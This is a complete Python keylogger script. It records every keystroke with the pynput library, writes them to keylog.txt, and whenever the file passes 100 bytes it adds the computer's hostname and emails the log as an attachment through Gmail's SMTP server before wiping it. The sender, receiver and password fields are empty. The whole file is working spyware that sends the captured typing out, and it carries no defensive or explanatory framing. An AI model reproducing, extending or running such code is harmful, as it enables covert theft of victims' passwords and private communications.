import os
import ssl
import smtplib
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard

# Initialize an empty string to store keystrokes
log = ""

# Gmail credentials
sender_email = ""
receiver_email = ""
password = ""

# Function to send email with the keylog.txt file attached
def send_email():
    # Append the computer name to the log file
    computer_name = socket.gethostname()
    with open("keylog.txt", "a") as file:
        file.write(f"\nComputer Name: {computer_name}")

    # Create the email message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Keylog file"

    body = "Attached is the keylog file."
    message.attach(MIMEText(body, "plain"))

    # Attach the keylog.txt file
    filename = "keylog.txt"
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename= {filename}")
        message.attach(part)

    # Send the email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())

    # Clear the log and the file after sending the email
    global log
    log = ""
    open("keylog.txt", "w").close()

# Define the on_press function that will be called when a key is pressed
def on_press(key):
    global log
    try:
        # If the key is alphanumeric, add its char representation to the log
        log += key.char
    except AttributeError:
        # For special keys (like space, enter, etc.), add a placeholder
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        else:
            log += f" [{key}] "

    # Write the log to a file
    with open("keylog.txt", "w") as file:
        file.write(log)

    # Check if file size is 100 bytes or more
    if os.path.getsize("keylog.txt") >= 100:
        send_email()

# Define the on_release function that will stop the keylogger when Esc is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener to monitor keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
